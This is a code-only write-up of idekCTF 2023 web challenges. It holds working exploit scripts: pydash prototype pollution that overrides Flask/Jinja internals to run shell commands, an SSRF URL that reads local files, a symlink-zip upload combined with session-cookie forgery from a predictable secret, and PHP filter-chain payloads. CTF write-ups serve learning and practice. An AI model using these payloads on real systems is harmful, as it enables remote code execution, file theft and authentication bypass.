# 2023IdekCTFWriteup

> 原文: https://www.ctfiot.com/92876.html
> ID: 92876


```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
```



```
@app.route("/api/manage_tasks", methods=["POST"])
def manage_tasks():
 task, status = request.json.get('task'), request.json.get('status')
 try:
 if not task or type(task) != str:
 return {"message": "You must provide a task name as a string!"}, 400
 if len(task) > 150:
 return {"message": "Tasks may not be over 150 characters long!"}, 400
 if status and len(status) > 50:
 return {"message": "Statuses may not be over 50 characters long!"}, 400
 if not status:
 tasks.complete(task)
 return {"message": "Task marked complete!"}, 200
 if type(status) != str:
 return {"message": "Your status must be a string!"}, 400
 if tasks.set(task, status):
 return {"message": "Task updated!"}, 200
 return {"message": "Invalid task name!"}, 400
 except Exception as e:
 # e.
 print(e)
 return {"message": str(e)}, 200
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
```



```
import pydash

class TaskManager:
 protected = ["set", "get", "get_all", "__init__", "complete"]

 def __init__(self):
 self.set("capture the flag", "incomplete")

 def set(self, task, status):
 if task in self.protected:
 return
 pydash.set_(self, task, status)
 return True

 def complete(self, task):
 if task in self.protected:
 return
 pydash.set_(self, task, False)
 return True

 def get(self, task):
 if hasattr(self, task):
 return {task: getattr(self, task)}
 return {}

 def get_all(self):
 return self.__dict__
```



```
1
2
3
4
```



```
@app.before_first_request
def init():
 if app.env == "yojo":
 app.add_template_global(eval)
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
```



```
FROM python:3.8.16-slim-bullseye

RUN apt update && apt install -y xxd

RUN python3 -m pip install flask pydash

RUN echo "idek{[REDACTED]}" > /flag-$(head -c 16 /dev/urandom | xxd -p).txt

RUN useradd ctf

USER ctf

WORKDIR /app

COPY . .

ENTRYPOINT ["python3", "app.py"]
```



```
1
```



```
{"task":"__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app._static_folder","status":"/"}
```



```
1
2
3
4
5
6
```



```
@app.route("/<path:path>")
def render_page(path):
 app._got_first_request = False
 if not os.path.exists("templates/" + path):
 return "not found", 404
 return render_template(path)
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
```



```
import requests
import re

base_url = "http://localhost:1337"
#base_url = "https://task-manager-dc512c530573c0b4.instancer.idek.team"

hijack_start = """'""']:\n value = """
hijack_end = "\n"

payloads = {
 "__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.env": "yolo",
 "__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.jinja_env.globals.value": "__import__('os').popen('cat /flag-*.txt').read()",
 "__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_start_string": hijack_start,
 "__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_end_string": hijack_end,
 "__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir": "ZZZ",
 "__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app._got_first_request": None,
 
}

def overwrite(attr, value):
 data = {"task": attr, "status": value}
 requests.post(base_url + "/api/manage_tasks", json=data)

def get_flag():
 url = base_url + "/../../usr/local/lib/python3.8/turtle.py"
 s = requests.Session()
 r = requests.Request(method='GET', url=url)
 prep = r.prepare()
 prep.url = url
 r = s.send(prep)
 flag = re.findall('idek{.*}', r.text)[0]
 print(flag)

for k, v in payloads.items():
 overwrite(k, v)

get_flag()
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
```



```
app = Flask(
 __name__,
 static_url_path='/static',
 static_folder='./static',
 )

PREMIUM_TOKEN = os.urandom(32).hex()

limiter = Limiter(app, key_func=get_remote_address)

@app.after_request
def add_headers(response):
 response.cache_control.max_age = 120
 return response

@app.route('/')
def index():
 return render_template('index.html')

@app.route('/proxy/<path:path>')
@limiter.limit("10/minute")
def proxy(path):
 remote_addr = request.headers.get('X-Forwarded-For') or request.remote_addr
 is_authorized = request.headers.get('X-Premium-Token') == PREMIUM_TOKEN or remote_addr == "127.0.0.1"
 try:
 page = urlopen(path, timeout=.5)
 except:
 return render_template('proxy.html', auth=is_authorized)
 if is_authorized:
 output = page.read().decode('latin-1')
 else:
 output = f"<pre>{page.headers.as_string()}</pre>"
 return render_template('proxy.html', auth=is_authorized, content=output)
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
```



```
events {
 worker_connections 1024;
}

http {
 include mime.types;
 proxy_cache_path /tmp/nginx keys_zone=my_zone:10m inactive=60m use_temp_path=off;

 server {

 listen 1337;
 client_max_body_size 64M;

 location / {
 proxy_set_header Host $http_host;
 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
 proxy_pass http://localhost:3000;
 }

 location ^~ /static/ {
 proxy_pass http://localhost:3000;
 proxy_set_header Host $http_host;
 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
 proxy_cache my_zone;
 add_header X-Proxy-Cache $upstream_cache_status;
 }
 }
}
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
```



```
@full_url.setter
def full_url(self, url):
 # unwrap('<URL:type://host/path>') --> 'type://host/path'
 self._full_url = unwrap(url)
 self._full_url, self.fragment = _splittag(self._full_url)
 self._parse()
 
def _splittag(url):
 """splittag('/path#tag') --> '/path', 'tag'."""
 path, delim, tag = url.rpartition('#')
 if delim:
 return path, tag
 return url, None
```



```
1
```



```
http://127.0.0.1:1337/proxy/http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/a
```



```
1
```



```
http://127.0.0.1:1337/proxy/http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/a
```



```
1
2
3
4
5
```



```
@app.route("/flag")
def flag():
 if not session.get("admin"):
 return "Unauthorized!"
 return subprocess.run("./flag", shell=True, stdout=subprocess.PIPE).stdout.decode("utf-8")
```



```
1
```



```
app.config["SECRET_KEY"] = os.environ["SECRET_KEY"]
```



```
1
2
3
```



```
SECRET_OFFSET = 0 # REDACTED
random.seed(round((time.time() + SECRET_OFFSET) * 1000))
os.environ["SECRET_KEY"] = "".join([hex(random.randint(0, 15)) for x in range(32)]).replace("0x", "")
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
```



```
@app.route("/upload", methods=["GET", "POST"])
def upload():
 if not session.get("uid"):
 return redirect("/login")
 if request.method == "GET":
 return render_template("upload.html")

 if "file" not in request.files:
 flash("You didn't upload a file!", "danger")
 return render_template("upload.html")
 
 file = request.files["file"]
 uuidpath = str(uuid.uuid4())
 filename = f"{DATA_DIR}uploadraw/{uuidpath}.zip"
 file.save(filename)
 subprocess.call(["unzip", filename, "-d", f"{DATA_DIR}uploads/{uuidpath}"]) 
 flash(f'Your unique ID is <a href="/uploads/{uuidpath}">{uuidpath}</a>!', "success")
 logger.info(f"User {session.get('uid')} uploaded file {uuidpath}")
 return redirect("/upload")
```



```
1
2
3
4
5
6
```



```
@app.route("/uploads/<path:path>")
def uploads(path):
 try:
 return send_from_directory(DATA_DIR + "uploads", path)
 except PermissionError:
 abort(404)
```



```
1
2
3
4
5
6
7
8
9
10
```



```
# Configure logging
LOG_HANDLER = logging.FileHandler(DATA_DIR + 'server.log')
LOG_HANDLER.setFormatter(logging.Formatter(fmt="[{levelname}] [{asctime}] {message}", style='{'))
logger = logging.getLogger("application")
logger.addHandler(LOG_HANDLER)
logger.propagate = False
for handler in logging.root.handlers[:]:
 logging.root.removeHandler(handler)
logging.basicConfig(level=logging.WARNING, format='%(asctime)s %(levelname)s %(name)s %(threadName)s : %(message)s')
logging.getLogger().addHandler(logging.StreamHandler())
```



```
1
```



```
decoded = {'admin': True, 'uid': userinfo['username']}
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
```



```
import base64

import requests, re, time, datetime, random
import flask_unsign

sess = requests.session()
SECRET_OFFSET = -67198624 * 1000
userinfo = {"username": "yyds", "password": "yyds"}
baseurl = "http://127.0.0.1:1337/"
pocZip = "UEsDBAoAAAAAACJsMVZvT1MBDwAAAA8AAAAKABwAc2VydmVyLmxvZ1VUCQADDzPGYw8zxmN1eAsAAQT1AQAABBQAAAAvdG1wL3NlcnZlci5sb2dQSwMECgAAAAAAG2wxVuPo95IOAAAADgAAAAkAHABjb25maWcucHlVVAkAAwUzxmMFM8ZjdXgLAAEE9QEAAAQUAAAAL2FwcC9jb25maWcucHlQSwECHgMKAAAAAAAibDFWb09TAQ8AAAAPAAAACgAYAAAAAAAAAAAA7aEAAAAAc2VydmVyLmxvZ1VUBQADDzPGY3V4CwABBPUBAAAEFAAAAFBLAQIeAwoAAAAAABtsMVbj6PeSDgAAAA4AAAAJABgAAAAAAAAAAADtoVMAAABjb25maWcucHlVVAUAAwUzxmN1eAsAAQT1AQAABBQAAABQSwUGAAAAAAIAAgCfAAAApAAAAAAA"
cookie = ""
log_url = ""

def register():
 reg_url = baseurl + "register"
 sess.post(reg_url, userinfo)

def login():
 global cookie
 set_cookie = sess.post(baseurl + "login", data=userinfo, allow_redirects=False).headers['Set-Cookie']
 cookie = set_cookie[8:82]

def upload():
 global log_url
 log_url = re.search('<a href="/uploads/.*">', sess.post(
 baseurl + "upload", headers={'Cookie': f'session={cookie}'},
 files={'file': base64.b64decode(pocZip)}).text).group()[9:-2]

def read():
 server_log = baseurl + log_url + "/server.log"
 config = baseurl + log_url + "/config.py"
 SECRET_OFFSET = int(re.findall("SECRET_OFFSET = (.*?) # REDACTED", sess.get(config).text)[0]) * 1000
 log = sess.get(server_log).text
 now = (time.mktime(datetime.datetime.strptime(log.split('\n')[0][1:20], "%Y-%m-%d %H:%M:%S").timetuple())) * 1000
 return SECRET_OFFSET,now

if __name__ == '__main__':
 register()
 login()
 upload()
 SECRET_OFFSET, now = read()
 while 1:
 decoded = {'admin': True, 'uid': userinfo['username']}
 random.seed(round(now + int(SECRET_OFFSET)))
 SECRET_KEY = "".join([hex(random.randint(0, 15)) for x in range(32)]).replace("0x", "")
 flag_url = baseurl + "flag"
 res = sess.get(flag_url, headers={'Cookie': f'session={flask_unsign.sign(decoded, SECRET_KEY)}'}).text
 if "idek" not in res:
 now += 1
 print(now)
 continue
 print(res)
 break
```



```
1
```



```
http.HandleFunc("/just-read-it", justReadIt)
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
```



```
func justReadIt(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
 w.WriteHeader(500)
 w.Write([]byte("bad request\n"))
 return
	}

	reqData := ReadOrderReq{}
	if err := json.Unmarshal(body, &reqData); err != nil {
 w.WriteHeader(500)
 w.Write([]byte("invalid body\n"))
 return
	}

	if len(reqData.Orders) > MaxOrders {
 w.WriteHeader(500)
 w.Write([]byte("whoa there, max 10 orders!\n"))
 return
	}

	reader := bytes.NewReader(randomData)
	validator := NewValidator()

	ctx := context.Background()
	for _, o := range reqData.Orders {
 if err := validator.CheckReadOrder(o); err != nil {
 w.WriteHeader(500)
 w.Write([]byte(fmt.Sprintf("error: %v\n", err)))
 return
 }

 ctx = WithValidatorCtx(ctx, reader, int(o))
 _, err := validator.Read(ctx)
 if err != nil {
 w.WriteHeader(500)
 w.Write([]byte(fmt.Sprintf("failed to read: %v\n", err)))
 return
 }
	}

	if err := validator.Validate(ctx); err != nil {
 w.WriteHeader(500)
 w.Write([]byte(fmt.Sprintf("validation failed: %v\n", err)))
 return
	}

	w.WriteHeader(200)
	w.Write([]byte(os.Getenv("FLAG")))
}
```



```
1
2
3
```



```
type ReadOrderReq struct {
	Orders []int `json:"orders"`
}
```



```
1
```



```
reader := bytes.NewReader(randomData)
```



```
1
2
3
4
5
6
7
8
```



```
func initRandomData() {
	rand.Seed(1337)
	randomData = make([]byte, 24576)
	if _, err := rand.Read(randomData); err != nil {
 panic(err)
	}
	copy(randomData[12625:], password[:])
}
```



```
1
2
3
4
5
6
```



```
func (v *Validator) CheckReadOrder(o int) error {
	if o <= 0 || o > 100 {
 return fmt.Errorf("invalid order %v", o)
	}
	return nil
}
```



```
1
2
```



```
ctx = WithValidatorCtx(ctx, reader, int(o))
_, err := validator.Read(ctx)
```



```
1
2
3
4
5
6
7
8
```



```
if err := validator.Validate(ctx); err != nil {
 w.WriteHeader(500)
 w.Write([]byte(fmt.Sprintf("validation failed: %v\n", err)))
 return
	}

	w.WriteHeader(200)
	w.Write([]byte(os.Getenv("FLAG")))
```



```
1
2
3
4
5
6
7
8
9
10
11
```



```
func (v *Validator) Validate(ctx context.Context) error {
	r, _ := GetValidatorCtxData(ctx)
	buf, err := v.Read(WithValidatorCtx(ctx, r, 32))
	if err != nil {
 return err
	}
	if bytes.Compare(buf, password[:]) != 0 {
 return errors.New("invalid password")
	}
	return nil
}
```



```
1
2
3
4
5
6
7
8
9
```



```
func (v *Validator) Read(ctx context.Context) ([]byte, error) {
	r, s := GetValidatorCtxData(ctx)
	buf := make([]byte, s)
	_, err := r.Read(buf)
	if err != nil {
 return nil, fmt.Errorf("read error: %v", err)
	}
	return buf, nil
}
```



```
1
2
3
4
5
6
7
8
```



```
func GetValidatorCtxData(ctx context.Context) (io.Reader, int) {
	reader := ctx.Value(reqValReaderKey).(io.Reader)
	size := ctx.Value(reqValSizeKey).(int)
	if size >= 100 {
 reader = bufio.NewReader(reader)
	}
	return reader, size
}
```



```
1
2
3
4
```



```
// NewReader returns a new Reader whose buffer has the default size.
func NewReader(rd io.Reader) *Reader {
	return NewReaderSize(rd, defaultBufSize)
}
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
```



```
<?php

 error_reporting(0);
 set_include_path('articles/');

 if (isset($_GET['p'])) {
 $article_content = file_get_contents($_GET['p'], 1);

 if (strpos($article_content, 'PREMIUM') === 0) {
 die('Thank you for your interest in The idek Times, but this article is only for premium users!'); // TODO: implement subscriptions
 }
 else if (strpos($article_content, 'FREE') === 0) {
 echo "<article>$article_content</article>";
 die();
 }
 else {
 die('nothing here');
 }
 }
 
 ?>
```



```
1
```



```
FREE�B�5$TԕT���FV��F�F��U�E�7V'65##�u�C��W%��7w5�W"����>==�@C������>==�@
```



```
1
```



```
http://127.0.0.1/?p=php://filter/convert.base64-encode|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode/resource=flag
```



```
1
```



```
idek{Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPaper!}
```



```
1
```



```
python php_filter_chain_generator.py --chain 'FREE '
```



```
1
```



```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=flag
```
